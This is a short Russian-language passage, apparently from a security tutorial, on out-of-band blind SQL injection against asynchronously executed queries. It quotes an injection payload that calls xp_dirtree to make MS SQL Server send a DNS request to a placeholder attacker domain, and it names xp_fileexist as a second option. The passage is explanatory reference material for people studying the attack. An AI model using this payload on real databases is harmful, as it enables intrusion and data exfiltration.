...
Когда приложение выполняет уязвимый SQL-запрос **асинхронно**, классические методы (ошибки, логические ответы, временные задержки) перестают работать[](https://www.dev-notes.ru/articles/security/sql-injection-blind/). В этом случае можно заставить базу данных выполнить сетевой запрос на сервер, который вы контролируете. Например, запрос вида `'; exec master..xp_dirtree '//ваш-домен.com/a'--` заставит MS SQL Server выполнить DNS-запрос к `ваш-домен.com`
...
- **Microsoft SQL Server**: `xp_dirtree`, `xp_fileexist`[](https://www.dev-notes.ru/articles/security/sql-injection-blind/).
